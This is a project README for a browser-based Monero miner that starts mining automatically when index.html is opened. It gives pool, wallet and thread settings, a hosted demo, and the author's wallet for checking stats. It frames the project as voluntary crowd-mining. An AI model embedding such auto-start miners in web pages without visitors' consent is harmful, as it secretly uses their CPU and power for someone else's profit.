## Monero Webminer

Html & Js code allowing Mining of XMR (Monero) on browsers.
This set-up is part of a common shared project, fitted for
our needs and meant as an easy-to-share targetted crowd-mining
pedagogic path of learning and discovering XMR
and pooling aswell.


# Configure

In index.html are this settings to be adjusted as needed:

- Pool
- XMR Wallet (we use same address and also same
- Miner name (to work fusioned together for same target across the world)
- Threads (-1 means unlimited, automatic by default, --cpu-max-threads=100 for full capacity)
- Miner Password (Optional, as Moneroocean does not use password, if your pool does, it is usually "x",
          and as [https://monero.hasvault.pro](https://monero.hashvault.pro) uses them as identifier)


# Running

Open index.html in any web browser and it will automatically start mining.

(find an example shown (for now) at [https://monero-miner.vercel.app/](https://monero-miner.vercel.app/)

# Check worker influence

Most browser are based on a model including the menu `more tools` which will provide you with
    1. a `Task manager` (Gestionnaire des t√¢ches) were you should recognize the side-effects.
    2. `Development tools` can help you find errors if any, else some details are explicit.
  else, with those extreme settings, watching global CPU monitors is for you.

# Check Progress 

Go to [https://monero.hashvault.pro](https://monero.hashvault.pro), as it is the pool you are connected to,
it will show your hashrates and balance right after the filling of right line with the used XMR Address

fascinating charts..

# How do I know if it works??

1. Open [monero-miner.vercel.app](https://monero-miner.vercel.app/)
2. Also Open https://supportxmr.com/ in a new tab
3. Paste in my XMR Address 457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu
4. You will see what "XMRingShare" is, Mining ethically. You can also do the same 

# Use In Other Projects
(should need reclarification asap)

Thank you for choosing our Monero Webminer. We hope you'll find it useful and profiteroles to run, adapt
or simply (hoped for soon) just make you an option 1-clic-away available,
allowing the best choice to offer few seconds because a little is not nothing :D
